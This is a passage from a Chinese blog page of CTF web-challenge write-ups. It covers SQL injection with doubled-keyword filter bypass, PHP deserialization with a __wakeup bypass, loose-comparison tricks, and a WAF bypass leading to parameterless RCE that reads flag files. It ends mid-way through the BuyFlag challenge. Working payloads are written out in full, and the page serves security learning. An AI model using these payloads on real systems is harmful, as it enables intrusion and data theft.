<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">




<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

  <meta name="author" content="鱿鱼">





<title>web 刷题 | 鱿鱼</title>



<link rel="icon" href="/favicon.png">



<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/nprogress/nprogress.css">



<script src="/lib/jquery.min.js"></script>


<script src="/lib/iconify-icon.min.js"></script>


<script src="https://cdn.tailwindcss.com?plugins=typography"></script>
<script>
  tailwind.config = {
    darkMode: "class",
  };
</script>


<script src="/lib/nprogress/nprogress.js"></script>

<script>
  $(document).ready(() => {
    NProgress.configure({
      showSpinner: false,
    });
    NProgress.start();
    $("#nprogress .bar").css({
      background: "#de7441",
    });
    $("#nprogress .peg").css({
      "box-shadow": "0 0 2px #de7441, 0 0 4px #de7441",
    });
    $("#nprogress .spinner-icon").css({
      "border-top-color": "#de7441",
      "border-left-color": "#de7441",
    });
    setTimeout(function () {
      NProgress.done();
      $(".fade").removeClass("out");
    }, 800);
  });
</script>

<script>
  (function () {
    const prefersDark =
      window.matchMedia &&
      window.matchMedia("(prefers-color-scheme: dark)").matches;
    const setting = localStorage.getItem("hexo-color-scheme") || "auto";
    if (setting === "dark" || (prefersDark && setting !== "light"))
      document.documentElement.classList.toggle("dark", true);
    let isDark = document.documentElement.classList.contains("dark");
  })();

  $(document).ready(function () {
    // init icon
    const prefersDark =
      window.matchMedia &&
      window.matchMedia("(prefers-color-scheme: dark)").matches;
    const isDark = document.documentElement.classList.contains("dark");
    $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");

    function toggleGiscusTheme() {
      const isDark = document.documentElement.classList.contains("dark");
      const giscusFrame = document.querySelector("iframe.giscus-frame");
      if (giscusFrame) {
        giscusFrame.contentWindow.postMessage(
          {
            giscus: {
              setConfig: {
                theme: isDark ? "dark" : "light",
              },
            },
          },
          "https://giscus.app"
        );
      }
    }

    // toggle dark mode
    function toggleDark() {
      let isDark = document.documentElement.classList.contains("dark");
      const setting = localStorage.getItem("hexo-color-scheme") || "auto";
      isDark = !isDark;
      document.documentElement.classList.toggle("dark", isDark);
      $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
      if (prefersDark === isDark) {
        localStorage.setItem("hexo-color-scheme", "auto");
      } else {
        localStorage.setItem("hexo-color-scheme", isDark ? "dark" : "light");
      }
      toggleGiscusTheme();
    }

    // listen dark mode change
    window
      .matchMedia("(prefers-color-scheme: dark)")
      .addEventListener("change", (e) => {
        const setting = localStorage.getItem("hexo-color-scheme") || "auto";
        if (setting === "auto") {
          document.documentElement.classList.toggle("dark", e.matches);
          $("#theme-icon").attr(
            "icon",
            e.matches ? "ri:moon-line" : "ri:sun-line"
          );
          toggleGiscusTheme();
        }
      });

    $("#toggle-dark").click((event) => {
      const isAppearanceTransition = document.startViewTransition && !window.matchMedia('(prefers-reduced-motion: reduce)').matches
      if (!isAppearanceTransition) {
        toggleDark()
        return
      }
      const x = event.clientX
      const y = event.clientY
      const endRadius = Math.hypot(
        Math.max(x, innerWidth - x),
        Math.max(y, innerHeight - y),
      )
      const transition = document.startViewTransition(async () => {
        toggleDark()
      })

      transition.ready
        .then(() => {
          const isDark = document.documentElement.classList.contains("dark")
          const clipPath = [
            `circle(0px at ${x}px ${y}px)`,
            `circle(${endRadius}px at ${x}px ${y}px)`,
          ]
          document.documentElement.animate(
            {
              clipPath: isDark
                ? [...clipPath].reverse()
                : clipPath,
            },
            {
              duration: 400,
              easing: 'ease-out',
              pseudoElement: isDark
                ? '::view-transition-old(root)'
                : '::view-transition-new(root)',
            },
          )
        })
    });
  });
</script>




<meta name="generator" content="Hexo 7.3.0"></head>
<body class="font-sans bg-white dark:bg-zinc-900 text-gray-700 dark:text-gray-200 relative">
  <header class="fixed w-full px-5 py-1 z-10 backdrop-blur-xl backdrop-saturate-150 border-b border-black/5">
  <div class="max-auto">
    <nav class="flex items-center text-base">
      <a href="/" class="group">
        <h2 class="font-medium tracking-tighterp text-l p-2">
          <img class="w-5 mr-2 inline-block transition-transform group-hover:rotate-[30deg]" id="logo" src="/images/logo.svg" alt="鱿鱼" />
          鱿鱼
        </h2>
      </a>
      <div id="header-title" class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis">
        web 刷题
      </div>
      <div class="flex-1"></div>
      <div class="flex items-center gap-3">
        
          <a class="hidden sm:flex" href="/archives">Posts</a>
        
        
          
            <a class="w-5 h-5 hidden sm:flex" title="Github" target="_blank" rel="noopener" href="https://github.com/squid1LLL">
              <iconify-icon width="20" icon="ri:github-line"></iconify-icon>
            </a>
          
        
        <a class="w-5 h-5 hidden sm:flex" title="Github" href="rss2.xml">
          <iconify-icon width="20" icon="ri:rss-line"></iconify-icon>
        </a>
        <a class="w-5 h-5" title="toggle theme" id="toggle-dark">
          <iconify-icon width="20" icon="" id="theme-icon"></iconify-icon>
        </a>
      </div>
      <div class="flex items-center justify-center gap-3 ml-3 sm:hidden">
        <span class="w-5 h-5" aria-hidden="true" role="img" id="open-menu">
          <iconify-icon width="20" icon="carbon:menu" ></iconify-icon>
        </span>
        <span class="w-5 h-5 hidden" aria-hidden="true" role="img" id="close-menu">
          <iconify-icon  width="20" icon="carbon:close" ></iconify-icon>
        </span>
      </div>
    </nav>
  </div>
</header>
<div id="menu-panel" class="h-0 overflow-hidden sm:hidden fixed left-0 right-0 top-12 bottom-0 z-10">
  <div id="menu-content" class="relative z-20 bg-white/80 px-6 sm:px-8 py-2 backdrop-blur-xl -translate-y-full transition-transform duration-300">
    <ul class="nav flex flex-col sm:flex-row text-sm font-medium">
      
        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
          <a href="/archives" class="flex h-12 sm:h-auto items-center">Posts</a>
        </li>
      
    </ul>
  </div>
  <div class="mask bg-black/20 absolute inset-0"></div>
</div>

  <main class="pt-14">
    <!-- css -->

<link rel="stylesheet" href="/lib/fancybox/fancybox.min.css">


<link rel="stylesheet" href="/lib/tocbot/tocbot.min.css">

<!-- toc -->

  <!-- tocbot -->
<nav class="post-toc toc text-sm w-48 relative top-32 right-0 opacity-70 hidden lg:block" style="position: fixed !important;"></nav>


<section class="px-6 max-w-prose mx-auto md:px-0">
  <!-- header -->
  <header class="overflow-hidden pt-6 pb-6 md:pt-12">
    <div class="pt-4 md:pt-6">
      <h1 id="article-title" class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]">
        web 刷题
      </h1>
      <div>
        <section class="flex items-center gap-3 text-sm">
          <span class="flex items-center gap-1">
            <iconify-icon width="18" icon="carbon-calendar" ></iconify-icon>
            <time>2024-12-12</time>
          </span>
          <span class="text-gray-400">·</span>
          <span class="flex items-center gap-1">
            <iconify-icon width="18" icon="ic:round-access-alarm" ></iconify-icon>
            <span>105 min</span>
          </span>
          <span class="text-gray-400">·</span>
          <span class="flex items-center gap-1">
            <iconify-icon width="18" icon="icon-park-outline:font-search" ></iconify-icon>
            <span>22.2k words</span>
          </span>
          
        </section>
      </div>
    </div>
  </header>
  <!-- content -->
  <article class="post-content prose m-auto slide-enter-content dark:prose-invert">
    <h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><h3 id="极客大挑战-2019-BabySQL-1"><a href="#极客大挑战-2019-BabySQL-1" class="headerlink" title="[极客大挑战 2019]BabySQL 1:"></a>[极客大挑战 2019]BabySQL 1:</h3><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a><strong>考点</strong></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL注入双写绕过过滤</span><br></pre></td></tr></table></figure>

<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;--+&#x27;和&#x27;#&#x27;</span><br><span class="line">都是作为注释的作用；</span><br><span class="line">--是sql里的注释+号是url里的空格</span><br><span class="line">--要和语句后面的引号 用空格隔开才有用</span><br></pre></td></tr></table></figure>

<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a><strong>解题过程</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">step1-测试回显位置:</span><br><span class="line">先测试回显在用户名那里还是密码那里，测试之后是在密码那里；</span><br><span class="line">payload：1&#x27; order by 1#</span><br><span class="line"></span><br><span class="line">step2-双写绕过过滤:</span><br><span class="line">观察到der 1#可以知道or和by被过滤了,于是双写绕过：</span><br><span class="line">payload: 1&#x27; oorrder bbyy 1,2,3,4#</span><br><span class="line"></span><br><span class="line">step3-联合查询注入:</span><br><span class="line">于是我们知道有3个位置可以回显有用信息，于是我们进行联合查询</span><br><span class="line">payload: 1&#x27; union select 1,database(),3#</span><br><span class="line"></span><br><span class="line">step4-双写绕过过滤:</span><br><span class="line">语句有问题观察报错，发现union和select被过滤了</span><br><span class="line">payload: 1&#x27; ununionion selselectect 1,database(),3#</span><br><span class="line"></span><br><span class="line">step5-最终payload:</span><br><span class="line">在后面发现，where,from也被过滤了</span><br><span class="line">payload:</span><br><span class="line">爆表：</span><br><span class="line">1&#x27; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;geek&#x27;#</span><br><span class="line">爆列：</span><br><span class="line">1&#x27; uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=&#x27;b4bsql&#x27;#</span><br><span class="line">爆数据：</span><br><span class="line">1&#x27; ununionion seselectlect 1,2,group_concat(username,passwoorrd) frfromom geek.b4bsql# </span><br></pre></td></tr></table></figure>

<h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><h3 id="极客大挑战-2019-PHP1"><a href="#极客大挑战-2019-PHP1" class="headerlink" title="[极客大挑战 2019]PHP1"></a>[极客大挑战 2019]PHP1</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.常用的备份文件名：(这里说的source file考察的是备份文件名字)</span><br><span class="line">index.phps</span><br><span class="line">index.php.bak</span><br><span class="line">index.php.swp</span><br><span class="line">www.zip</span><br><span class="line">2.从序列化到反序列化这几个函数的执行过程是：</span><br><span class="line">__construct() -&gt;__sleep -&gt; __wakeup() -&gt; __toString() -&gt; __destruct()</span><br><span class="line">3.变量的属性：</span><br><span class="line">public：属性被序列化的时候属性值会变成 属性名</span><br><span class="line"></span><br><span class="line">protected：属性被序列化的时候属性值会变成 \x00*\x00属性名</span><br><span class="line"></span><br><span class="line">private：属性被序列化的时候属性值会变成 \x00类名\x00属性名</span><br><span class="line"></span><br><span class="line">\x00是空字符（不是空格）空字符并没有被实例化  %00</span><br><span class="line">4._wakeup()绕过</span><br><span class="line"> 序列化的字符串中的 属性值 个数 大于 属性个数 就会导致反序列化异常，从而绕过 __wakeup()</span><br></pre></td></tr></table></figure>

<h4 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">看到那个备份网站，我就想到了www.zip,网站的所有文件都在www文件下  payload：url/www.zip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">step2:</span><br><span class="line">下载文件后在index.php里面我们看到了,在让我们传一个叫select的参数，然后对其反序列化，运行class.php这个脚本</span><br><span class="line">&lt;?php</span><br><span class="line">include &#x27;class.php&#x27;;</span><br><span class="line">$select=$_GET[&#x27;select&#x27;];</span><br><span class="line">$res=unserialize(@$select);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">step3:</span><br><span class="line">class.php  整个脚本就是设置了两个private变量，用了设置了一个wakeup()方法（会在每次反序列化前调用它），在这是每次调用它都会把username的值变成guest;而后就是一个destruct()方法，内容就是对username，和password的验证；只有username=admin,password=100才打印flag；</span><br><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">step4:</span><br><span class="line">序列化得到我们要传的 （O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;）</span><br><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;&#125;</span><br><span class="line">$a=new Name(&#x27;admin&#x27;,&#x27;100&#x27;);</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">step5：</span><br><span class="line">绕过</span><br><span class="line">但是由于这两个是private变量，以及可以看到那个Nameusername只有12个字符，前面却写着14，所以空字符并没有被实例化</span><br><span class="line">同时，反序历化前会调用wakeup(),destruct()又在wakeup之后，所以我们得绕过wakeup</span><br><span class="line">payload:url/?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id><a href="#" class="headerlink" title></a></h3><h3 id="ACTF2020-新生赛-BackupFile-1"><a href="#ACTF2020-新生赛-BackupFile-1" class="headerlink" title="[ACTF2020 新生赛]BackupFile 1"></a>[ACTF2020 新生赛]BackupFile 1</h3><h4 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.弱比较：字符串和数字做弱比较时会把字符串截取到第一个非数字字符前，即&#x27;123ffws&#x27;相当于123</span><br></pre></td></tr></table></figure>

<h4 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">step1:backuofile 用/index.php.bak访问，得到源码</span><br><span class="line">让我们get传参，参数必须是数字，同时key必须和str的值一样，才能得到flag,但是这里有个intval()函数，他会把key的内容转为整数</span><br><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class="line">    $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">step2:</span><br><span class="line">绕过：</span><br><span class="line">payload:url/?key=123</span><br></pre></td></tr></table></figure>

<h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><h3 id="RoarCTF-2019-Easy-Calc-1"><a href="#RoarCTF-2019-Easy-Calc-1" class="headerlink" title="[RoarCTF 2019]Easy Calc 1"></a>[RoarCTF 2019]Easy Calc 1</h3><h4 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1.php特性绕过waf:</span><br><span class="line">PHP在接收URL传入的内容时，会将空格去除，将一些特殊字符转换为下划线（转换对象也包含空格）。</span><br><span class="line">这里在num传参和?之后加入一个空格就可以绕过waf</span><br><span class="line">2.命令执行函数：</span><br><span class="line">·exec()</span><br><span class="line">·shell_exec()</span><br><span class="line">·system()</span><br><span class="line">·passthru()</span><br><span class="line">·反引号（``）</span><br><span class="line">  eg:$output = `&#123;$command&#125;`;</span><br><span class="line">3.无参数rce:</span><br><span class="line"></span><br><span class="line">·特征：</span><br><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;    </span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">这时如果我们用传统的eval($_POST[‘code’]); 则无法通过正则的校验 /[^\W]+((?R)?)/</span><br><span class="line">对于该正则只允许形如 a(b(c())); a();</span><br><span class="line">也就是只能使用函数套娃，里面的函数所产生的信息就是作为参数</span><br><span class="line"></span><br><span class="line">·基础函数学习：</span><br><span class="line">    localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">    scandir() 列出 images 目录中的文件和目录。</span><br><span class="line">    readfile()  输出一个文件。</span><br><span class="line">    current() 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line">    pos() current() 的别名。</span><br><span class="line">    next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">    array_reverse()以相反的元素顺序返回数组。</span><br><span class="line">    highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br><span class="line">    current(localeconv())   永远都是个点</span><br><span class="line">    localeconv()    函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.</span><br><span class="line">    current()     返回数组中的当前单元, 默认取第一个值。</span><br><span class="line">    pos()      是current()的别名。</span><br><span class="line">    var_dump()是判断一个变量的类型与长度,并输出变量的数值,如果变量有值输的是变量的值并回返数据类型.此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。</span><br></pre></td></tr></table></figure>

<h4 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">F12在js代码那里看到calc.php,访问进去</span><br><span class="line">就是让我们传一个叫num的参数，看到后面这里有个eval函数，所以在这里我们可以命令执行；我试了下/?num=system(&#x27;ls /&#x27;);他阻止了我们访问，按理来说，我这里的‘不满足那个黑名单，应该会回显what are you want to do?</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&#x27;num&#x27;];</span><br><span class="line">        $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;,&#x27;\$&#x27;,&#x27;\\&#x27;,&#x27;\^&#x27;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">step2:</span><br><span class="line">利用php特性绕过waf,waf不让num传入字母，于是我们可以在num前加一个空格，绕过waf  /? num=system(&#x27;ls /&#x27;);过了</span><br><span class="line">注意到黑名单里面引号，反引号什么的都不让用；所以那些常规命令执行函数用不了</span><br><span class="line">于是利用无参数rce;用到的函数有var_dump()[显示文件];scandir();chr()[因为/也被过滤了，所以我们利用chr,把码转为ascii];file_get_contents()[读取文件]。</span><br><span class="line">payload:url/calc.php? num=var_dump(scandir(chr(47))) 看到f1agg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">step3:读取f11ag</span><br><span class="line">payload:url/calc.php? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="极客大挑战-2019-BuyFlag-1"><a href="#极客大挑战-2019-BuyFlag-1" class="headerlink" title="[极客大挑战 2019]BuyFlag 1:"></a>[极客大挑战 2019]BuyFlag 1:</h3><h4 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.弱比较</span><br><span class="line">2.php 5.3.3 strucmp函数</span><br><span class="line">strcmp()比较的是字符串类型</span><br><span class="line">int strcmp(const char *s1, const char *s2);</span><br><span class="line"></span><br><span class="line">如果s1和s2相等，返回0。</span><br><span class="line">如果s1小于s2（按照字典顺序，即从小到大的字符顺序），返回负数。</span><br><span class="line">如果s1大于s2，返回正数。</span><br><span class="line"></span><br><span class="line">如果强行传入其他类型参数，会出错，出错后返回值0，正是利用这点进行绕过。</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-1"><a href="#解题过程：-1" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">打开页面，在首页看不到有用信息，然后在payflag看到,这里有一些买到flag的要求：是CUIT的学生，正确的密码；然后我在源码里面看到了一段代码：</span><br><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">	$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password == 404) &#123;</span><br><span 